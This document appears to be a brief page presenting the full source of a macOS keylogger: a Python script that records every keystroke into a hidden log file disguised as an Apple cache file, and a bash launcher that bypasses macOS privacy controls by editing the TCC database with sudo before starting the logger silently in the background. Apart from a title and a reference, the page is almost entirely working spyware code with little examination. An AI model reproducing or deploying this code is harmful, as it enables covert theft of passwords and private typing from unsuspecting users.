# Examining a very simple macOS Python keylogger

Credits to Andrew Scott for the code.

### `pkl.py`

```python
#!/usr/bin/env python
import os, sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from ConfigParser import SafeConfigParser
from AppKit import NSApplication, NSApp
from Foundation import NSObject
from Cocoa import NSEvent, NSKeyDownMask
from PyObjCTools import AppHelper

parser = SafeConfigParser()
try:
    parser.read('.src/p.ini')
    SEPARATOR = parser.get('p','sep') or ','
    DIRECTORY = parser.get('p','dir') or '/Library/Caches'
    FILENAME = parser.get('p','filename') or 'com.apple.pkl'
    FALLBACK = parser.get('p','fallback') or '/'
except:
    SEPARATOR = ','
    # a file that looks innocent and blends in with other applications.
    DIRECTORY = '/Library/Caches'
    FILENAME = 'com.apple.pkl'
    FALLBACK = '/'

class AppDelegate(NSObject):
    '''
    The App Delegate creates a mask to detect the key being pressed and adds
    a global monitor for this mask.
    '''
    def applicationDidFinishLaunching_(self, notification):
        mask_down = NSKeyDownMask
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask_down, key_handler)

class Writer:
    '''
    This class contains the methods necessary to create an output file and write
    the collected keystrokes to that file.
    '''
    def __init__(self):
        self.path = self.create_log()
        self.leng = 0

    def get_target_directory(self):
        try:
            if os.getlogin():
                return '/Users/{}{}'.format(os.getlogin(), DIRECTORY)
            return FALLBACK
        except:
            return FALLBACK

    def create_log(self):
        dir = self.get_target_directory()
        filepath = os.path.join(dir, FILENAME)
        f = open(filepath, 'w+')
        f.close()
        return filepath

    def write_to_log(self, value_char, value_raw):
        self.leng += 1
        with open(self.path, 'a') as f:
            f.write('{}{}{}\n'.format(value_char, SEPARATOR, value_raw))

w = Writer()

def key_handler(event):
    '''
    Translates the key press events into readable characters if one exists
    the key code is also recorded for non-character input.
    '''
    try:
        capture_char = event.characters()
        capture_raw = event.keyCode()
        w.write_to_log(capture_char, capture_raw)
    except KeyboardInterrupt:
        AppHelper.stopEventLoop()

if __name__ == '__main__':
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()
```

### `run_script.sh`
```bash
#!/bin/bash
# author: Andrew Scott
# date: 9-3-2018

CAN_RUN_KEY=1
SHOULD_TRY_PERM=1
# check if macOS
OS=$(uname)
if ! [ $OS == "Darwin" ]; then
    exit 0
fi

# check version, must be greater than 10.12.x
# if version is valid check to ensure that SIP is disabled.
VERSION=$(sw_vers -productVersion)
MINOR=$(echo $VERSION | cut -d. -f2)
if [ $MINOR -ge 12 ]; then
    SIP=$(csrutil status)
    if [ "$SIP" == "System Integrity Protection status: enabled." ]; then
        exit 0
    fi
else 
    exit 0
fi

# set permissions for terminal to allow access for assistive devices
if [ $SHOULD_TRY_PERM == 1 ]; then
    sudo chmod 664 "/Library/Application Support/com.apple.TCC/TCC.db" &> /dev/null
    TRY1=$(sudo sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" "INSERT or REPLACE INTO access VALUES('kTCCServiceAccessibility','com.apple.Terminal',0,1,1,NULL,NULL);" 2>&1)
    TRY2=$(sudo sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" "INSERT or REPLACE INTO access VALUES('kTCCServiceAccessibility','com.googlecode.iterm2',0,1,1,NULL,NULL);" 2>&1)
    if [[ $TRY1 == *"Error"* ]] && [[ $TRY2 == *"Error"* ]]; then
        exit 0
    fi
fi

# install necessary libraries
pip install -r .src/requirements.txt &> /dev/null

# run script
python .src/pkl.py &

# exit
exit 0
```


## References
- Hackernoon, Writing a basic keylogger for macOS in Python. ([original](https://hackernoon.com/writing-an-keylogger-for-macos-in-python-24adfa22722), [archive](https://archive.is/4R7YF))